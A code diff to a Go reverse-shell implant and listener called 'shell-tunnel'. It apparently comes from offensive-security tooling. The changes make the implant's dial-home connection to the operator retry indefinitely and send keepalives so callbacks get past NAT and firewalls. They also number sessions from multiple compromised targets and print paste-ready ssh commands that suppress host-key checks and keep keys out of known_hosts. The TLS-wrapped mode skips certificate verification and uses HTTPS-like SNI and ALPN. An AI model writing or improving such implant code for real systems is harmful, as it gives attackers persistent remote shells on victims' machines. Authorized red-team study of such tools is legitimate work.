@@ -35,6 +35,7 @@ import (
 	"path"
 	"strconv"
 	"strings"
+	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -58,6 +59,9 @@ type params struct {
 }
 
 const detachEnvKey = "_SHELL_TUNNEL_DETACHED"
+
+// dialRetryDelay is how long a dial-home attempt waits before trying again.
+const dialRetryDelay = 5 * time.Second
 
 func shouldDetach() bool {
 	if os.Getenv(detachEnvKey) == "1" {
@@ -149,10 +153,10 @@ func createSFTPHandler() ssh.SubsystemHandler {
 			outWarnf("Sftp server init error: %v", err)
 			return
 		}
+		defer server.Close()
 
 		outInfof("New sftp connection from %s", s.RemoteAddr().String())
 		if err := server.Serve(); err == io.EOF {
-			server.Close()
 			outInfof("Sftp connection closed by client")
 		} else if err != nil {
 			outWarnf("Sftp server exited with error: %v", err)
@@ -205,27 +209,32 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
 	}
 
-	// Attempt to connect with localPassword initially and keep asking for password on failure
+	// Attempt to connect with localPassword initially and keep asking for
+	// password on failure. A dial-home payload must outlive the listener
+	// being late and VPN blips, so a failed attempt is retried every
+	// dialRetryDelay instead of killing the process; only a password we
+	// cannot ask for ends the loop.
 	for {
 		if tlsWrap {
 			// TLS-wrapped connection: TCP -> TLS -> SSH
 			tcpConn, dialErr := net.Dial("tcp", address)
 			if dialErr != nil {
-				return nil, dialErr
+				err = dialErr
+			} else {
+				tlsConfig := &tls.Config{
+					InsecureSkipVerify: true,
+					ServerName:         tlsSNI,
+					NextProtos:         []string{"h2", "http/1.1"},
+				}
+				tlsConn := tls.Client(tcpConn, tlsConfig)
+				sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
+				if dialErr == nil {
+					client = gossh.NewClient(sshConn, chans, reqs)
+					break
+				}
+				tlsConn.Close()
+				err = dialErr
 			}
-			tlsConfig := &tls.Config{
-				InsecureSkipVerify: true,
-				ServerName:         tlsSNI,
-				NextProtos:         []string{"h2", "http/1.1"},
-			}
-			tlsConn := tls.Client(tcpConn, tlsConfig)
-			sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
-			if dialErr == nil {
-				client = gossh.NewClient(sshConn, chans, reqs)
-				break
-			}
-			tlsConn.Close()
-			err = dialErr
 		} else {
 			client, err = gossh.Dial("tcp", address, config)
 			if err == nil {
@@ -235,18 +244,21 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 
 		if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
 			fmt.Println("Enter password:")
-			data, err := term.ReadPassword(int(syscall.Stdin))
-			if err != nil {
-				outWarnf("%v", err)
-				continue
+			data, readErr := term.ReadPassword(int(syscall.Stdin))
+			if readErr != nil {
+				// No terminal to ask on: retrying would spin forever
+				// redialling, so give the error back instead.
+				return nil, readErr
 			}
 
 			config.Auth = []gossh.AuthMethod{
 				gossh.Password(string(data)),
 			}
-		} else {
-			return nil, err
+			continue
 		}
+
+		outWarnf("Dialling home to %s failed: %v; retrying in %s", address, err, dialRetryDelay)
+		time.Sleep(dialRetryDelay)
 	}
 
 	bindAddr := fmt.Sprintf("127.0.0.1:%d", homeBindPort)
@@ -260,6 +272,18 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 
 	actualAddr := ln.Addr().String()
 	outOkf("listening at home on %s", actualAddr)
+
+	// Keep NAT and stateful firewalls from eating an idle callback. The
+	// goroutine ends by itself once the connection is gone.
+	go func() {
+		ticker := time.NewTicker(15 * time.Second)
+		defer ticker.Stop()
+		for range ticker.C {
+			if _, _, err := client.SendRequest("keepalive@openssh.com", true, nil); err != nil {
+				return
+			}
+		}
+	}()
 
 	// Verify port allocation worked (defensive check)
 	if homeBindPort == 0 && strings.HasSuffix(actualAddr, ":0") {
@@ -305,6 +329,10 @@ func sendExtraInfo(client *gossh.Client, listeningAddress string) {
 	}
 }
 
+// sessionCounter numbers callbacks in the order they land, so several
+// targets calling the same listener stay tellable apart.
+var sessionCounter atomic.Uint64
+
 func createExtraInfoHandler() ssh.ChannelHandler {
 	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
 		var extraInfo ExtraInfo
@@ -314,14 +342,32 @@ func createExtraInfoHandler() ssh.ChannelHandler {
 			outWarnf("Could not parse extra info from %s", conn.RemoteAddr())
 			return
 		}
+		id := sessionCounter.Add(1)
 		outOkf(
-			"New connection from %s: %s on %s reachable via %s",
-			conn.RemoteAddr(),
+			"Session %d: %s on %s (from %s), reachable via %s",
+			id,
 			extraInfo.CurrentUser,
 			extraInfo.Hostname,
+			conn.RemoteAddr(),
 			extraInfo.ListeningAddress,
 		)
+		printConnectLines(extraInfo.ListeningAddress)
 	}
+}
+
+// printConnectLines gives the operator two paste-ready commands when a
+// callback lands: one starts a ControlMaster with the engagement's ssh
+// hygiene flags, the next opens the interactive session over that socket.
+// Forwards and sftp then share the one authenticated connection, and the
+// per-run host key never touches ~/.ssh/known_hosts.
+func printConnectLines(listeningAddress string) {
+	host, port, err := net.SplitHostPort(listeningAddress)
+	if err != nil {
+		return
+	}
+	sock := fmt.Sprintf("/tmp/shell-tunnel-%s.sock", port)
+	outPromptf("ssh -fNM -S %s -p %s %s@%s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes", sock, port, LUSER, host)
+	outPromptf("ssh -S %s -p %s %s@%s", sock, port, LUSER, host)
 }
 
 func setupParameters(noCLI string, tlsWrapVar string, tlsSNIVar string) *params {
@@ -356,6 +402,7 @@ Options:
 	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
 		(if only remote port forwarding is needed, e.g. when catching reverse connections)
 	-v, Emit status output ([ok]/[!]/[x]/[i] lines; respects NO_COLOR)
+	-V, --version, Print the version and exit
 
 <target>
 	Optional target which enables the reverse scenario. Can be prepended with
@@ -367,9 +414,10 @@ Credentials:
 	 * PubKey   "%[4]s"
 `, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)
 
+	// Print only: flag.ExitOnError exits 0 for -h and 2 for a parse error
+	// (0 ok, 1 runtime, 2 usage), so Usage itself must never exit.
 	flag.Usage = func() {
 		fmt.Print(help)
-		os.Exit(1)
 	}
 
 	p := params{}
@@ -388,7 +436,14 @@ Credentials:
 	flag.StringVar(&p.shell, "s", defaultShell, "")
 	flag.BoolVar(&p.noShell, "N", false, "")
 	flag.BoolVar(&p.verbose, "v", false, "")
+	showVersion := flag.Bool("V", false, "")
+	flag.BoolVar(showVersion, "version", false, "")
 	flag.Parse()
+
+	if *showVersion {
+		fmt.Printf("shell-tunnel v%s\n", version)
+		os.Exit(0)
+	}
 
 	if p.LPORT > 65535 {
 		outFatalf("Port (-p) must be between 1 and 65535")
